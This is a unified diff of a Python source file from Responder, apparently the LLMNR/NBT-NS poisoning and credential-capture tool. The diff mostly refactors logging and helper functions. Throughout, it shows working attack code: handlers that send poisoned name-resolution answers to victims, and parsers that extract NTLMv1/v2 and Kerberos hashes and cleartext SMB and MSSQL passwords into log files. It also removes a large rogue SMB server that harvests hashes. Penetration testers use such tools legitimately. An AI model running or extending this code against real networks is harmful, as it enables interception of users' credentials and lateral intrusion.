@@ -16,8 +16,8 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler,BaseServer
-from Fingerprint import RunSmbFinger,OsNameClientVersion
+from SocketServer import TCPServer, UDPServer, ThreadingMixIn, StreamRequestHandler, BaseRequestHandler, BaseServer
+from Fingerprint import RunSmbFinger, OsNameClientVersion
 from odict import OrderedDict
 from socket import inet_aton
 from random import randrange
@@ -63,28 +63,6 @@ AnalyzeFilename = "./logs/responder/Analyze-LLMNR-NBT-NS.log"
 logger3 = logging.getLogger('Analyze LLMNR/NBT-NS')
 logger3.addHandler(logging.FileHandler(AnalyzeFilename,'a'))
 
-def IsOsX():
-	Os_version = sys.platform
-	if Os_version == "darwin":
-		return True
-	else:
-		return False
-
-def OsInterfaceIsSupported(INTERFACE):
-	if INTERFACE != "Not set":
-		if IsOsX():
-			return False
-		else:
-			return True
-	if INTERFACE == "Not set":
-		return False
-
-def Analyze(AnalyzeMode):
-	if AnalyzeMode == True:
-		return True
-	else:
-		return False
-
 #Function used to write captured hashs to a file.
 def WriteData(outfile,data, user):
 	if os.path.isfile(outfile) == False:
@@ -105,35 +83,6 @@ def WriteData(outfile,data, user):
 					outf2.write(data)
 					outf2.write("\n")
 					outf2.close()
-
-def PrintData(outfile,user):
-	if Verbose == True:
-		return True
-	if os.path.isfile(outfile) == True:
-		with open(outfile,"r") as filestr:
-			if re.search(user.encode('hex'), filestr.read().encode('hex')):
-				filestr.close()
-				return False
-			if re.search(re.escape("$"), user):
-				filestr.close()
-				return False
-			else:
-				return True
-	else:
-		return True
-
-def PrintLLMNRNBTNS(outfile,Message):
-	if Verbose == True:
-		return True
-	if os.path.isfile(outfile) == True:
-		with open(outfile,"r") as filestr:
-			if re.search(re.escape(Message), filestr.read()):
-				filestr.close()
-				return False
-			else:
-				return True
-	else:
-		return True
 
 #Packet class handling all packet generation (see odict.py).
 class Packet():
@@ -250,7 +199,7 @@ def NBT_NS_Role(data):
 
 # Define what are we answering to.
 def Validate_NBT_NS(data,Wredirect):
-	if Analyze(AnalyzeMode):
+	if AnalyzeMode:
 		return False
 
 	if NBT_NS_Role(data[43:46]) == "File Server Service.":
@@ -294,7 +243,7 @@ class NB(BaseRequestHandler):
 		if DontRespondToSpecificName(DontRespondToName) and DontRespondToNameScope(DontRespondToName.upper(), Name.upper()):
 			return None 
 
-		if Analyze(AnalyzeMode):
+		if AnalyzeMode:
 			if data[2:4] == "\x01\x10":
 				if Is_Finger_On(Finger_On_Off):
 					try:
@@ -304,15 +253,11 @@ class NB(BaseRequestHandler):
 					except Exception:
 						Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s\n"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
 						logger3.warning(Message)
-					if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-						print Message
 				else:
 					Message = "[Analyze mode: NBT-NS] Host: %s is looking for : %s. Service requested is: %s"%(self.client_address[0], Name,NBT_NS_Role(data[43:46]))
-					if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-						print Message
 					logger3.warning(Message)
 
-		if RespondToSpecificHost(RespondTo) and Analyze(AnalyzeMode) == False:
+		if RespondToSpecificHost(RespondTo) and AnalyzeMode == False:
 			if RespondToIPScope(RespondTo, self.client_address[0]):
 				if data[2:4] == "\x01\x10":
 					if Validate_NBT_NS(data,Wredirect):
@@ -322,10 +267,8 @@ class NB(BaseRequestHandler):
 							for x in range(1):
 								socket.sendto(str(buff), self.client_address)
 								Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-								responder_logger.info(Message)
-								if PrintLLMNRNBTNS(Log2Filename,Message):
-									#print Message
-									logger2.warning(Message)
+								#responder_logger.info(Message)
+								logger2.warning(Message)
 								if Is_Finger_On(Finger_On_Off):
 									try:
 										Finger = RunSmbFinger((self.client_address[0],445))
@@ -342,10 +285,8 @@ class NB(BaseRequestHandler):
 							for x in range(1):
 								socket.sendto(str(buff), self.client_address)
 								Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-								responder_logger.info(Message)
-								if PrintLLMNRNBTNS(Log2Filename,Message):
-									#print Message
-									logger2.warning(Message)
+								#responder_logger.info(Message)
+								logger2.warning(Message)
 								if Is_Finger_On(Finger_On_Off):
 									try:
 										Finger = RunSmbFinger((self.client_address[0],445))
@@ -363,17 +304,15 @@ class NB(BaseRequestHandler):
 
 		else:
 			if data[2:4] == "\x01\x10":
-				if Validate_NBT_NS(data,Wredirect) and Analyze(AnalyzeMode) == False:
+				if Validate_NBT_NS(data,Wredirect) and AnalyzeMode == False:
 					if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
 						buff = NBT_Ans()
 						buff.calculate(data)
 						for x in range(1):
 							socket.sendto(str(buff), self.client_address)
 						Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-						responder_logger.info(Message)
-						if PrintLLMNRNBTNS(Log2Filename,Message):
-							#print Message
-							logger2.warning(Message)
+						#responder_logger.info(Message)
+						logger2.warning(Message)
 						if Is_Finger_On(Finger_On_Off):
 							try:
 								Finger = RunSmbFinger((self.client_address[0],445))
@@ -390,10 +329,8 @@ class NB(BaseRequestHandler):
 						for x in range(1):
 							socket.sendto(str(buff), self.client_address)
 						Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-						responder_logger.info(Message)
-						if PrintLLMNRNBTNS(Log2Filename,Message):
-							#print Message
-							logger2.warning(Message)
+						#responder_logger.info(Message)
+						logger2.warning(Message)
 						if Is_Finger_On(Finger_On_Off):
 							try:
 								Finger = RunSmbFinger((self.client_address[0],445))
@@ -537,13 +474,9 @@ def BecomeBackup(data,Client):
 			Name = Decode_Name(data[15:47])
 			Role = NBT_NS_Role(data[45:48])
 			Message = "[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s wants to become a Local Master Browser Backup on this domain: %s."%(Client, Name,Role,Domain)
-			if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-				print Message
 			if AnalyzeMode:
 				Message1=RAPThisDomain(Client,Domain)
-				if PrintLLMNRNBTNS(AnalyzeFilename,Message1):
-					print Message1
-					logger3.warning(Message1)
+				logger3.warning(Message1)
 			logger3.warning(Message)
 	except:
 		pass
@@ -556,13 +489,10 @@ def BecomeBackup(data,Client):
 		Role2 = NBT_NS_Role(data[79:82])
 		Message = '[Analyze mode: Browser]Datagram Request from IP: %s hostname: %s via the: %s to: %s. Service: %s'%(Client, Name, Role1, Domain, Role2)
 		if Role2 == "Domain controller service. This name is a domain controller." or Role2 == "Browser Election Service." or Role2 == "Local Master Browser.":
-			if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-				print Message
 			if AnalyzeMode:
 				Message1=RAPThisDomain(Client,Domain)
-				if PrintLLMNRNBTNS(AnalyzeFilename,Message1):
-					print Message1
-					logger3.warning(Message1)
+
+				logger3.warning(Message1)
 			logger3.warning(Message)
 	except:
 		pass
@@ -572,324 +502,15 @@ class Browser(BaseRequestHandler):
 	def handle(self):
 		try:
 			request, socket = self.request
-			if Analyze(AnalyzeMode):
+			if AnalyzeMode:
 				ParseDatagramNBTNames(request,self.client_address[0])
 				BecomeBackup(request,self.client_address[0])
 			BecomeBackup(request,self.client_address[0])
 		except Exception:
 			pass
-##################################################################################
-#SMB Server
-##################################################################################
-
-#Detect if SMB auth was Anonymous
-def Is_Anonymous(data):
-	SecBlobLen = struct.unpack('<H',data[51:53])[0]
-	if SecBlobLen < 260:
-		SSPIStart = data[75:]
-		LMhashLen = struct.unpack('<H',data[89:91])[0]
-		if LMhashLen == 0 or LMhashLen == 1:
-			return True
-		else:
-			return False
-	if SecBlobLen > 260:
-		SSPIStart = data[79:]
-		LMhashLen = struct.unpack('<H',data[93:95])[0]
-		if LMhashLen == 0 or LMhashLen == 1:
-			return True
-		else:
-			return False
-
-def Is_LMNT_Anonymous(data):
-	LMhashLen = struct.unpack('<H',data[51:53])[0]
-	if LMhashLen == 0 or LMhashLen == 1:
-		return True
-	else:
-		return False
-
-#Function used to know which dialect number to return for NT LM 0.12
-def Parse_Nego_Dialect(data):
-	DialectStart = data[40:]
-	pack = tuple(DialectStart.split('\x02'))[:10]
-	var = [e.replace('\x00','') for e in DialectStart.split('\x02')[:10]]
-	test = tuple(var)
-	if test[0] == "NT LM 0.12":
-		return "\x00\x00"
-	if test[1] == "NT LM 0.12":
-		return "\x01\x00"
-	if test[2] == "NT LM 0.12":
-		return "\x02\x00"
-	if test[3] == "NT LM 0.12":
-		return "\x03\x00"
-	if test[4] == "NT LM 0.12":
-		return "\x04\x00"
-	if test[5] == "NT LM 0.12":
-		return "\x05\x00"
-	if test[6] == "NT LM 0.12":
-		return "\x06\x00"
-	if test[7] == "NT LM 0.12":
-		return "\x07\x00"
-	if test[8] == "NT LM 0.12":
-		return "\x08\x00"
-	if test[9] == "NT LM 0.12":
-		return "\x09\x00"
-	if test[10] == "NT LM 0.12":
-		return "\x0a\x00"
-
-def ParseShare(data):
-	packet = data[:]
-	a = re.search('(\\x5c\\x00\\x5c.*.\\x00\\x00\\x00)', packet)
-	if a:
-		quote = "Share requested: "+a.group(0)
-		responder_logger.info(quote.replace('\x00',''))
-
-#Parse SMB NTLMSSP v1/v2
-def ParseSMBHash(data,client):
-	SecBlobLen = struct.unpack('<H',data[51:53])[0]
-	BccLen = struct.unpack('<H',data[61:63])[0]
-	if SecBlobLen < 260:
-		SSPIStart = data[75:]
-		LMhashLen = struct.unpack('<H',data[89:91])[0]
-		LMhashOffset = struct.unpack('<H',data[91:93])[0]
-		LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
-		NthashLen = struct.unpack('<H',data[97:99])[0]
-		NthashOffset = struct.unpack('<H',data[99:101])[0]
-
-	if SecBlobLen > 260:
-		SSPIStart = data[79:]
-		LMhashLen = struct.unpack('<H',data[93:95])[0]
-		LMhashOffset = struct.unpack('<H',data[95:97])[0]
-		LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
-		NthashLen = struct.unpack('<H',data[101:103])[0]
-		NthashOffset = struct.unpack('<H',data[103:105])[0]
-
-	if NthashLen == 24:
-		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
-		DomainLen = struct.unpack('<H',data[105:107])[0]
-		DomainOffset = struct.unpack('<H',data[107:109])[0]
-		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
-		UserLen = struct.unpack('<H',data[113:115])[0]
-		UserOffset = struct.unpack('<H',data[115:117])[0]
-		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-		writehash = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal
-		outfile = "./logs/responder/SMB-NTLMv1ESS-Client-"+client+".txt"
-		if PrintData(outfile,User+"::"+Domain):
-			#print "[+]SMB-NTLMv1 hash captured from : ",client
-			#print "[+]SMB complete hash is :", writehash
-			WriteData(outfile,writehash,User+"::"+Domain)
-		responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
-
-	if NthashLen > 60:
-		outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
-		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
-		DomainLen = struct.unpack('<H',data[109:111])[0]
-		DomainOffset = struct.unpack('<H',data[111:113])[0]
-		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
-		UserLen = struct.unpack('<H',data[117:119])[0]
-		UserOffset = struct.unpack('<H',data[119:121])[0]
-		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
-		writehash = User+"::"+Domain+":"+NumChal+":"+NtHash[:32]+":"+NtHash[32:]
-		if PrintData(outfile,User+"::"+Domain):
-			#print "[+]SMB-NTLMv2 hash captured from : ",client
-			#print "[+]SMB complete hash is :", writehash
-			WriteData(outfile,writehash,User+"::"+Domain)
-		responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(writehash))
-
-#Parse SMB NTLMv1/v2
-def ParseLMNTHash(data,client):
-	try:
-		lenght = struct.unpack('<H',data[43:45])[0]
-		LMhashLen = struct.unpack('<H',data[51:53])[0]
-		NthashLen = struct.unpack('<H',data[53:55])[0]
-		Bcc = struct.unpack('<H',data[63:65])[0]
-		if NthashLen > 25:
-			Hash = data[65+LMhashLen:65+LMhashLen+NthashLen]
-			responder_logger.info('[+]SMB-NTLMv2 hash captured from :%s'%(client))
-			outfile = "./logs/responder/SMB-NTLMv2-Client-"+client+".txt"
-			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
-			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
-			Username, Domain = tuple(var)
-			Writehash = Username+"::"+Domain+":"+NumChal+":"+Hash.encode('hex')[:32].upper()+":"+Hash.encode('hex')[32:].upper()
-			if PrintData(outfile,Username+"::"+Domain):
-				#print "[+]SMB-NTLMv2 hash captured from :",client
-				#print "[+]SMB-NTLMv2 complete hash is :",Writehash
-				ParseShare(data)
-				WriteData(outfile,Writehash, Username+"::"+Domain)
-			responder_logger.info('[+]SMB-NTLMv2 complete hash is :%s'%(Writehash))
-		if NthashLen == 24:
-			responder_logger.info('[+]SMB-NTLMv1 hash captured from :%s'%(client))
-			outfile = "./logs/responder/SMB-NTLMv1-Client-"+client+".txt"
-			pack = tuple(data[89+NthashLen:].split('\x00\x00\x00'))[:2]
-			var = [e.replace('\x00','') for e in data[89+NthashLen:Bcc+60].split('\x00\x00\x00')[:2]]
-			Username, Domain = tuple(var)
-			writehash = Username+"::"+Domain+":"+data[65:65+LMhashLen].encode('hex').upper()+":"+data[65+LMhashLen:65+LMhashLen+NthashLen].encode('hex').upper()+":"+NumChal
-			if PrintData(outfile,Username+"::"+Domain):
-				#print "[+]SMB-NTLMv1 hash captured from : ",client
-				#print "[+]SMB complete hash is :", writehash
-				ParseShare(data)
-				WriteData(outfile,writehash, Username+"::"+Domain)
-			responder_logger.info('[+]SMB-NTLMv1 complete hash is :%s'%(writehash))
-			responder_logger.info('[+]SMB-NTLMv1 Username:%s'%(Username))
-			responder_logger.info('[+]SMB-NTLMv1 Domain (if joined, if not then computer name) :%s'%(Domain))
-	except Exception:
-		raise
-
-def IsNT4ClearTxt(data):
-	HeadLen = 36
-	Flag2 = data[14:16]
-	if Flag2 == "\x03\x80":
-		SmbData = data[HeadLen+14:]
-		WordCount = data[HeadLen]
-		ChainedCmdOffset = data[HeadLen+1]
-		if ChainedCmdOffset == "\x75":
-			PassLen = struct.unpack('<H',data[HeadLen+15:HeadLen+17])[0]
-			if PassLen > 2:
-				Password = data[HeadLen+30:HeadLen+30+PassLen].replace("\x00","")
-				User = ''.join(tuple(data[HeadLen+30+PassLen:].split('\x00\x00\x00'))[:1]).replace("\x00","")
-				#print "[SMB]Clear Text Credentials: %s:%s" %(User,Password)
-				responder_logger.info("[SMB]Clear Text Credentials: %s:%s"%(User,Password))
-
-#SMB Server class, NTLMSSP
-class SMB1(BaseRequestHandler):
-
-	def handle(self):
-		try:
-			while True:
-				data = self.request.recv(1024)
-				self.request.settimeout(1)
-				##session request 139
-				if data[0] == "\x81":
-					buffer0 = "\x82\x00\x00\x00"
-					self.request.send(buffer0)
-					data = self.request.recv(1024)
-				##Negotiate proto answer.
-				if data[8:10] == "\x72\x00":
-					#Customize SMB answer.
-					head = SMBHeader(cmd="\x72",flag1="\x88", flag2="\x01\xc8", pid=pidcalc(data),mid=midcalc(data))
-					t = SMBNegoKerbAns(Dialect=Parse_Nego_Dialect(data))
-					t.calculate()
-					final = t
-					packet0 = str(head)+str(final)
-					buffer0 = longueur(packet0)+packet0
-					self.request.send(buffer0)
-					data = self.request.recv(1024)
-					##Session Setup AndX Request
-				if data[8:10] == "\x73\x00":
-					IsNT4ClearTxt(data)
-					head = SMBHeader(cmd="\x73",flag1="\x88", flag2="\x01\xc8", errorcode="\x16\x00\x00\xc0", uid=chr(randrange(256))+chr(randrange(256)),pid=pidcalc(data),tid="\x00\x00",mid=midcalc(data))
-					t = SMBSession1Data(NTLMSSPNtServerChallenge=Challenge)
-					t.calculate()
-					final = t
-					packet1 = str(head)+str(final)
-					buffer1 = longueur(packet1)+packet1
-					self.request.send(buffer1)
-					data = self.request.recv(4096)
-					if data[8:10] == "\x73\x00":
-						if Is_Anonymous(data):
-							head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid="\x00\x00",uid=uidcalc(data),mid=midcalc(data))###should always send errorcode="\x72\x00\x00\xc0" account disabled for anonymous logins.
-							final = SMBSessEmpty()
-							packet1 = str(head)+str(final)
-							buffer1 = longueur(packet1)+packet1
-							self.request.send(buffer1)
-						else:
-							ParseSMBHash(data,self.client_address[0])
-							head = SMBHeader(cmd="\x73",flag1="\x98", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-							final = SMBSession2Accept()
-							final.calculate()
-							packet2 = str(head)+str(final)
-							buffer2 = longueur(packet2)+packet2
-							self.request.send(buffer2)
-							data = self.request.recv(1024)
-				##Tree Connect IPC Answer
-				if data[8:10] == "\x75\x00":
-					ParseShare(data)
-					head = SMBHeader(cmd="\x75",flag1="\x88", flag2="\x01\xc8", errorcode="\x00\x00\x00\x00", pid=pidcalc(data), tid=chr(randrange(256))+chr(randrange(256)), uid=uidcalc(data), mid=midcalc(data))
-					t = SMBTreeData()
-					t.calculate()
-					final = t
-					packet1 = str(head)+str(final)
-					buffer1 = longueur(packet1)+packet1
-					self.request.send(buffer1)
-					data = self.request.recv(1024)
-				##Tree Disconnect.
-				if data[8:10] == "\x71\x00":
-					head = SMBHeader(cmd="\x71",flag1="\x98", flag2="\x07\xc8", errorcode="\x00\x00\x00\x00",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-					final = "\x00\x00\x00"
-					packet1 = str(head)+str(final)
-					buffer1 = longueur(packet1)+packet1
-					self.request.send(buffer1)
-					data = self.request.recv(1024)
-				##NT_CREATE Access Denied.
-				if data[8:10] == "\xa2\x00":
-					head = SMBHeader(cmd="\xa2",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-					final = "\x00\x00\x00"
-					packet1 = str(head)+str(final)
-					buffer1 = longueur(packet1)+packet1
-					self.request.send(buffer1)
-					data = self.request.recv(1024)
-				##Trans2 Access Denied.
-				if data[8:10] == "\x25\x00":
-					head = SMBHeader(cmd="\x25",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-					final = "\x00\x00\x00"
-					packet1 = str(head)+str(final)
-					buffer1 = longueur(packet1)+packet1
-					self.request.send(buffer1)
-					data = self.request.recv(1024)
-				##LogOff.
-				if data[8:10] == "\x74\x00":
-					head = SMBHeader(cmd="\x74",flag1="\x98", flag2="\x07\xc8", errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-					final = "\x02\xff\x00\x27\x00\x00\x00"
-					packet1 = str(head)+str(final)
-					buffer1 = longueur(packet1)+packet1
-					self.request.send(buffer1)
-					data = self.request.recv(1024)
-
-		except Exception:
-			pass #no need to print errors..
-
-#SMB Server class, old version.
-class SMB1LM(BaseRequestHandler):
-
-	def handle(self):
-		try:
-			self.request.settimeout(0.5)
-			data = self.request.recv(1024)
-			##session request 139
-			if data[0] == "\x81":
-				buffer0 = "\x82\x00\x00\x00"
-				self.request.send(buffer0)
-				data = self.request.recv(1024)
-				##Negotiate proto answer.
-			if data[8:10] == "\x72\x00":
-				head = SMBHeader(cmd="\x72",flag1="\x80", flag2="\x00\x00",pid=pidcalc(data),mid=midcalc(data))
-				t = SMBNegoAnsLM(Dialect=Parse_Nego_Dialect(data),Domain="",Key=Challenge)
-				t.calculate()
-				packet1 = str(head)+str(t)
-				buffer1 = longueur(packet1)+packet1
-				self.request.send(buffer1)
-				data = self.request.recv(1024)
-				##Session Setup AndX Request
-			if data[8:10] == "\x73\x00":
-				if Is_LMNT_Anonymous(data):
-					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x72\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-					packet1 = str(head)+str(SMBSessEmpty())
-					buffer1 = longueur(packet1)+packet1
-					self.request.send(buffer1)
-				else:
-					ParseLMNTHash(data,self.client_address[0])
-					head = SMBHeader(cmd="\x73",flag1="\x90", flag2="\x53\xc8",errorcode="\x22\x00\x00\xc0",pid=pidcalc(data),tid=tidcalc(data),uid=uidcalc(data),mid=midcalc(data))
-					packet1 = str(head)+str(SMBSessEmpty())
-					buffer1 = longueur(packet1)+packet1
-					self.request.send(buffer1)
-					data = self.request.recv(1024)
-
-		except Exception:
-			self.request.close()
-			pass
-
 
 ##################################################################################
-#Kerberos Server
+#Kerberos Server stuff starts here
 ##################################################################################
 def ParseMSKerbv5TCP(Data):
 	MsgType = Data[21:22]
@@ -986,12 +607,8 @@ class KerbTCP(BaseRequestHandler):
 			KerbHash = ParseMSKerbv5TCP(data)
 			if KerbHash:
 				Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
-				if PrintData(Outfile,KerbHash):
-					#print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
-					#print "[+]MSKerbv5 complete hash is :", KerbHash
-					Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
-					WriteData(Outfile,KerbHash, KerbHash)
-					responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
+				WriteData(Outfile,KerbHash, KerbHash)
+				responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
 		except Exception:
 			raise
 
@@ -1003,17 +620,17 @@ class KerbUDP(BaseRequestHandler):
 			KerbHash = ParseMSKerbv5UDP(data)
 			if KerbHash:
 				Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
-				if PrintData(Outfile,KerbHash):
-					#print "[+]MSKerbv5 hash captured from : ", self.client_address[0]
-					#print "[+]MSKerbv5 complete hash is :", KerbHash
-					Outfile = "./logs/responder/MSKerberos-Client-"+self.client_address[0]+".txt"
-					WriteData(Outfile,KerbHash, KerbHash)
-					responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
+				WriteData(Outfile,KerbHash, KerbHash)
+				responder_logger.info('[+]MSKerbv5 complete hash is :%s'%(KerbHash))
 		except Exception:
 			raise
 
 ##################################################################################
-#SQL Stuff
+#Kerberos Server stuff ends here
+##################################################################################
+
+##################################################################################
+#SQL Stuff starts here
 ##################################################################################
 
 #This function parse SQL NTLMv1/v2 hash and dump it into a specific file.
@@ -1033,10 +650,7 @@ def ParseSQLHash(data,client):
 		UserOffset = struct.unpack('<H',data[48:50])[0]
 		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
 		outfile = "./logs/responder/MSSQL-NTLMv1-Client-"+client+".txt"
-		if PrintData(outfile,User+"::"+Domain):
-			#print "[+]MSSQL NTLMv1 hash captured from :",client
-			#print '[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal)
-			WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal, User+"::"+Domain)
+		WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal, User+"::"+Domain)
 		responder_logger.info('[+]MsSQL NTLMv1 hash captured from :%s'%(client))
 		responder_logger.info('[+]MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
 		responder_logger.info('[+]MSSQL NTLMv1 Domain is :%s'%(Domain))
@@ -1053,10 +667,7 @@ def ParseSQLHash(data,client):
 		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
 		outfile = "./logs/responder/MSSQL-NTLMv2-Client-"+client+".txt"
 		Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
-		if PrintData(outfile,User+"::"+Domain):
-			#print "[+]MSSQL NTLMv2 Hash captured from :",client
-			#print "[+]MSSQL NTLMv2 Complete Hash is : ", Writehash
-			WriteData(outfile,Writehash,User+"::"+Domain)
+		WriteData(outfile,Writehash,User+"::"+Domain)
 		responder_logger.info('[+]MsSQL NTLMv2 hash captured from :%s'%(client))
 		responder_logger.info('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
 		responder_logger.info('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
@@ -1078,10 +689,7 @@ def ParseClearTextSQLPass(Data,client):
 	UsernameLen = PwdOffset-UsernameOffset
 	PwdStr = ParseSqlClearTxtPwd(Data[8+PwdOffset:8+PwdOffset+PwdLen])
 	UserName = Data[8+UsernameOffset:8+UsernameOffset+UsernameLen].decode('utf-16le')
-	if PrintData(outfile,UserName+":"+PwdStr):
-		#print "[+]MSSQL PlainText Password captured from :",client
-		#print "[+]MSSQL Username: %s Password: %s"%(UserName, PwdStr)
-		WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
+	WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
 	responder_logger.info('[+]MSSQL PlainText Password captured from :%s'%(client))
 	responder_logger.info('[+]MSSQL Username: %s Password: %s'%(UserName, PwdStr))
 
@@ -1123,9 +731,12 @@ class MSSQL(BaseRequestHandler):
 		except Exception:
 			pass
 			self.request.close()
+##################################################################################
+#SQL Stuff ends here
+##################################################################################
 
 ##################################################################################
-#LLMNR Stuff
+#LLMNR Stuff starts here
 ##################################################################################
 
 #LLMNR Answer packet.
@@ -1193,7 +804,7 @@ class LLMNR(BaseRequestHandler):
 			if data[2:4] == "\x00\x00":
 				if Parse_IPV6_Addr(data):
 					Name = Parse_LLMNR_Name(data)
-					if Analyze(AnalyzeMode):
+					if AnalyzeMode:
 						if Is_Finger_On(Finger_On_Off):
 							try:
 								Finger = RunSmbFinger((self.client_address[0],445))
@@ -1202,13 +813,9 @@ class LLMNR(BaseRequestHandler):
 							except Exception:
 								Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
 								logger3.warning(Message)
-								if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-									print Message
 						else:
 							Message = "[Analyze mode: LLMNR] Host: %s is looking for : %s."%(self.client_address[0], Name)
-							if PrintLLMNRNBTNS(AnalyzeFilename,Message):
-								#print Message
-								logger3.warning(Message)
+							logger3.warning(Message)
 
 					if DontRespondToSpecificHost(DontRespondTo):
 						if RespondToIPScope(DontRespondTo, self.client_address[0]):
@@ -1218,7 +825,7 @@ class LLMNR(BaseRequestHandler):
 						return None 
 
 					if RespondToSpecificHost(RespondTo):
-						if Analyze(AnalyzeMode) == False:
+						if AnalyzeMode == False:
 							if RespondToIPScope(RespondTo, self.client_address[0]):
 								if RespondToSpecificName(RespondToName) == False:
 									buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
@@ -1226,10 +833,8 @@ class LLMNR(BaseRequestHandler):
 									for x in range(1):
 										soc.sendto(str(buff), self.client_address)
 										Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
-										responder_logger.info(Message)
-										if PrintLLMNRNBTNS(Log2Filename,Message):
-											#print Message
-											logger2.warning(Message)
+										#responder_logger.info(Message)
+										logger2.warning(Message)
 										if Is_Finger_On(Finger_On_Off):
 											try:
 												Finger = RunSmbFinger((self.client_address[0],445))
@@ -1247,10 +852,8 @@ class LLMNR(BaseRequestHandler):
 									for x in range(1):
 										soc.sendto(str(buff), self.client_address)
 										Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
-										responder_logger.info(Message)
-										if PrintLLMNRNBTNS(Log2Filename,Message):
-											#print Message
-											logger2.warning(Message)
+										#responder_logger.info(Message)
+										logger2.warning(Message)
 										if Is_Finger_On(Finger_On_Off):
 											try:
 												Finger = RunSmbFinger((self.client_address[0],445))
@@ -1262,16 +865,15 @@ class LLMNR(BaseRequestHandler):
 												responder_logger.info('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
 												pass
 
-					if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
+					if AnalyzeMode == False and RespondToSpecificHost(RespondTo) == False:
 						if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
 							buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
 							buff.calculate()
 							Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
 							for x in range(1):
 								soc.sendto(str(buff), self.client_address)
-							if PrintLLMNRNBTNS(Log2Filename,Message):
-								#print Message
-								logger2.warning(Message)
+
+							logger2.warning(Message)
 							if Is_Finger_On(Finger_On_Off):
 								try:
 									Finger = RunSmbFinger((self.client_address[0],445))
@@ -1288,9 +890,7 @@ class LLMNR(BaseRequestHandler):
 							 Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
